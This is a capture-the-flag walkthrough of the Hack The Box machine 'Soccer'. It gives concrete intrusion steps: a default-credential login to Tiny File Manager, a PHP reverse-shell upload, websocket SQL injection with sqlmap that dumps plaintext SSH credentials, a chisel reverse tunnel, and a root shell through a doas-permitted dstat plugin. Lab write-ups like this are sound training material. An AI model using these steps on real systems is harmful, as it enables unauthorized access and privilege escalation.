subdomain enumeration came up with no information;

Webenum using SecLists/Discovery/Web-Content/big.txt came out with a hit on,
http://soccer.htb/tiny/tinyfilemanager.php -> login for the tiny file manager

default login - admin:admin@123

there is an uploads page where you can simply upload your php rShell and gain access as a low-level user inside the system

python3 -c 'import pty; pty.spawn("/bin/bash")'

cannot use sudo -l

no clue what the password is for the user

adding linpeas.sh to the tmp folder directory we can chmod +x and execute;
linpeas tells us this machine is Vulnerable to CVE-2021-3560

viewing /etc/nginx/sites-avaiable/ -> this shows domains we can goto
	http://soc-player.soccer.htb/ -> carries a login page via email

Looking at the /ticket source code there was a variable called ID that was being sent to a web socket server on port 9091; this id could be injected so looking up, websocket sqli gave us a python script to combo with a sqlmap

using sqlmap and its --dump flag we can after a long time output ssh creds

player@player.htb:PlayerOftheMatch2022
player@10.10.11.194:PlayerOftheMatch2022 -> SSH

[player@soccer.htb]

user -> 6f754420f287488d0521b761fa569d5d

After SSH'ing into the machine, Player cannot run SUDO on the box

netstat -tl : shows tcp listening ports

./chisel client 10.10.14.110:8000 R:3000:127.0.0.1:3000 R:33060:127.0.0.1:33060

find / d -name [name] 2>/dev/null -> outputs all paths that have the name in it

Using the autoEnum.sh I made, looking for possible GTFO-Bins it showed doas

After Running:
player@soccer:~$ find / d -name doas.conf 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

What we can now do, is using doas:
	doas -u root /usr/bin/dstat
We can user the root username to run dstat

dstat is a GTFO-Bin:
	echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
	doas -u root /usr/bin/dstat -xxx
	
We Are Root!
